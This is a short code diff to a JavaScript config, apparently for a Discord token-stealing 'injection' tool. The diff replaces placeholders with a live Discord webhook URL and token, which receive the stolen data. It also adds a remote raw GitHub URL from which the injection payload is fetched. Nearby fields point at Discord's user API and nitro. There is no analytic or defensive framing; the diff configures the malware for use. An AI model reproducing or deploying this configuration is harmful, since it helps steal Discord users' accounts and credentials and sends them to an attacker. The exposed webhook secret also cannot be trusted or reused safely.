@@ -13,8 +13,8 @@ const config = {
     embed_name: "~~branding~~",
     embed_icon: "~~icon~~",
     embed_color: 8363488,
-    webhook: "%WEBHOOK_LINK%",
-    injection_url: "https://raw.githubusercontent.com/NobodyWouldEverUseThis7/Discord-Injection/main/file.js",
+    webhook: "https://discord.com/api/webhooks/1040654356367810682/JP1ftmqwpvaytMr-yjZuX8sXl_c4B7NNph5UyyF5p69td4XQJ2KuhynxR06RkRgWLT2J",
+    injection_url: "https://raw.githubusercontent.com/BARHOM1/brobr/main/file.js",
     /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
     api: "https://discord.com/api/v9/users/@me",
     nitro: {
